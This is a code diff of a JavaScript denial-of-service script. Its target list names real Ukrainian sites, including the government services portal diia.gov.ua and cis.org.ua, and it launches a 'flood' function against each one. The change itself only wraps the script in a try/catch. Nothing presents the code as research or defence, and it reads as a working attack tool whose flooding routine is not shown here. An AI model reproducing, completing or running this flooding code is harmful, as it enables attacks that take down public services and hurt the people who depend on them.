@@ -1,4 +1,5 @@
-    var targets = {
+try {
+var targets = {
         'https://diia.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
         // 'https://www.ubr.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
         'http://cis.org.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
@@ -63,3 +64,6 @@ async function flood(target) {
   
   // Start
   Object.keys(targets).map(flood)
+} catch (e) {
+    console.log("Time out.")
+}
